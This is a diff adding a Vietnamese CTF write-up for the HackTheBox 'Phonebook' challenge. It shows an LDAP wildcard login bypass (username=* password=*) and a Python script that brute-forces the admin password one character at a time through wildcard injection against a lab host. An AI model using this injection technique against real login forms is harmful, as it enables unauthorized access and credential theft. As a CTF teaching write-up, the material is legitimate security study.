@@ -157,6 +157,55 @@ while True:
         break
 print("Final pass:",flag)
 ```
->**Giải thích:** đoạn ``suop.p.get_text()[0:1] == '1'`` là lấy nội dung của respone từ tag <p> sau đó cắt lấy đoạn đầu. Nếu nó bằng 1 nghĩa là response trả về 1 result là admin -> trường hợp này đúng, sau đó thêm ký tự đang test vào flag
+>**Giải thích:** đoạn ``suop.p.get_text()[0:1] == '1'`` là lấy nội dung của respone từ tag ``<p>`` sau đó cắt lấy đoạn đầu. Nếu nó bằng 1 nghĩa là response trả về 1 result là admin -> trường hợp này đúng, sau đó thêm ký tự đang test vào flag
 
 >**FLAG:** dsy365gdzerzo94
+
+### C. Phonebook (HackTheBox)
+Đầu tiên trang web cho ta một form đăng nhập, và một lời nhắn từ Reese, ta đoán có thể Reese là admin
+![login](./img/login.png)\
+Khi ta thử đăng nhập với input bất kỳ thì nó trả về ``message=Authentication failed`` trong url
+![login](./img/failed.png)\
+Thử đăng nhập với ``username=*`` và ``password=*`` thì ta sẽ đăng nhập thành công và redirect ta qua trang ``/``
+![authen](./img/authen.png)\
+Trang ``/``
+![authen](./img/search.png)\
+Sau một hồi vọc vạch thì ta thấy trang này chỉ có chức năng search email thông thường và có vẻ không thể khai thác được gì từ đây. Nhưng trang này cho ta biết có ``username=Reese`` tức là username của admin là ``Reese``\
+Quay trở lại trang ``login`` ta sẽ thực hiện brute force tìm password của admin (Reese)
+Payload sẽ có dạng:
+```
+username=Reese&password=a*   --> message=Authentication failed
+username=Reese&password=b*   --> message=Authentication failed
+...
+username=Reese&password=H*   --> OK
+username=Reese&password=Ha*  --> message=Authentication failed
+...
+```
+Cứ như vậy ta tìm được pass của admin, và pass của admin cũng chính là flag của challange này
+Script brute force
+```python
+import requests
+import string
+
+wordlist = string.ascii_letters
+wordlist += "".join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'", '{', '}']) 
+url = "http://178.128.173.79:30886/login"
+
+flag = ""
+while True:
+    for c in wordlist:
+        data = {'username': 'Reese', 'password': flag+c+'*'}
+        print("Try[*]:",data)
+
+        resp = requests.post(url, data)
+        if resp.url[-6:] != "failed":
+            flag+=c
+            break
+    else:
+        break  
+print(flag)
+```
+![flag](./img/flag.png)\
+>**FLAG:** HTB{d1rectory_h4xx0r_is_k00l}
+
+
